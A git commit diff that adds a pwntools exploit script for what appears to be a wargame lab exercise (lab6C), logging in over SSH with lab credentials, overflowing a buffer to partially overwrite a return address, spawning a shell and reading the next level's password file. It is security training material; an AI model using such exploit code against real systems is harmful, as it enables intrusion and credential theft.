045368f8242f84a7f1f374df28ad54d4f83f2603
Jalynk2004 <81233886+Jalynk2004@users.noreply.github.com>
2023-03-07 23:04:03 +0700

    Update lab6C.py

--- lab06/lab6C.py
+++ lab06/lab6C.py
@@ -1,1 +1,18 @@
+from pwn import *
+
+s = ssh(host = '192.168.147.134', user = 'lab6C', password = 'lab06start')
+r = s.process(b"/levels/lab06/lab6C")
+
+r.recvuntil(b'Enter your username\n')
+payload = b'A' * 40
+payload += b'\xc6' # overwrite save->msglen in order to copy 198 bytes from the original buffer
+r.sendline(payload)
+
+payload = b'A' * 196
+payload += b'\x2b\x07' #partial overwrite the return address of handle_tweet
+r.sendline(payload)
+r.sendline(b'/bin/sh\x00')
+r.sendline(b'cat /home/lab6B/.pass')
+
+r.interactive()
 
